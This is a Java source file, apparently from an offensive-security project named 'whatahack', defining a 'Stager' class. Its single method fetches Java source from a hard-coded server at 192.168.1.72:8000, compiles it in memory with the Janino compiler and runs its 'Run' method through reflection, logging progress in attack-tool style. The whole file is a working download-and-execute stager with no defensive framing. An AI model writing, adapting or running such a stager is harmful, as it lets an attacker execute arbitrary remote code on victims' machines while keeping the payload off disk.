
package org.pyfffe.whatahack;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.StringReader;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLConnection;
import org.codehaus.janino.*;

public class Stager {

    public static int start() {

        // if we get here then a parameter was provided.
        String u = "http://192.168.1.72:8000/Payload.java";
        System.out.println("[*] URL provided: " + u);

        try {

            // URL for java code
            URL payloadServer = new URL(u);

            URLConnection yc = payloadServer.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    yc.getInputStream()));

            // Download code into memory
            String inputLine;
            StringBuffer payloadCode = new StringBuffer();
            while ((inputLine = in.readLine()) != null) {
                payloadCode.append(inputLine + "\n");
            }
            System.out.println("[*] Downloaded payload");

            // Compile it using Janino
            System.out.println("[*] Compiling ....");
            SimpleCompiler compiler = new SimpleCompiler();
            compiler.cook(new StringReader(payloadCode.toString()));
            Class<?> compiled = compiler.getClassLoader().loadClass("Payload") ;

            // Execute "Run" method using reflection
            System.out.println("[*] Executing ....");
            Method runMeth = compiled.getMethod("Run");
            // This form of invoke works when "Run" is static
            runMeth.invoke(null);

            System.out.println("[*] Payload, payloading ....");

            in.close();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return 0;

    }

}

